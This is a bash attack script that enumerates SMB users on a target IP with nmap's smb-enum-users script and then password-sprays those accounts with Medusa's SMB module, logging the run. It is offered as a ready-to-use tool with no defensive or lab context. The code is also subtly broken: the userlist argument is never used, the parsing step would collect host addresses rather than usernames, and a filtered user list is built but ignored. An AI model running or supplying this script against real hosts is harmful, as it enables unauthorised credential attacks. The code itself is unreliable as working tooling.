#!/bin/bash

# SMB Enumeration and Password Spraying Script

# Usage: ./smb_enumeration.sh <target_ip> <userlist_file> <password>

# Parameter validation
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <target_ip> <userlist_file> <password>"
    exit 1
fi

target_ip=$1
userlist_file=$2
password=$3

# Logging
log_file="smb_enumeration.log"
exec > >(tee -i "$log_file") 2>&1

echo "[$(date -u +'%Y-%m-%d %H:%M:%S')] Starting SMB enumeration on $target_ip"

# Nmap user enumeration with SMB
nmap -p 445 --script smb-enum-users $target_ip -oG - | grep -E '^[0-9]' | awk '{print $2}' | sort -u > users.txt

if [ $? -ne 0 ]; then
    echo "[$(date -u +'%Y-%m-%d %H:%M:%S')] Error during Nmap user enumeration."
    exit 1
fi

echo "[$(date -u +'%Y-%m-%d %H:%M:%S')] Users enumerated successfully."

echo -e "\n\033[1;32mUsers:\033[0m"
cat users.txt

# User extraction and filtering
filtered_users=$(cat users.txt | grep -E '^[^#;]')

if [ -z "$filtered_users" ]; then
    echo "[$(date -u +'%Y-%m-%d %H:%M:%S')] No valid users found. Exiting..."
    exit 1
fi

echo "[$(date -u +'%Y-%m-%d %H:%M:%S')] Starting password spraying using Medusa..."

# Medusa execution with SMB module for password spraying
medusa -h "$target_ip" -U users.txt -P <(echo "$password") -M smb

if [ $? -ne 0 ]; then
    echo "[$(date -u +'%Y-%m-%d %H:%M:%S')] Error during Medusa execution."
    exit 1
fi

echo "[$(date -u +'%Y-%m-%d %H:%M:%S')] Password spraying completed."

# Results
echo -e "\n\033[1;34mResults logged in: $log_file\033[0m"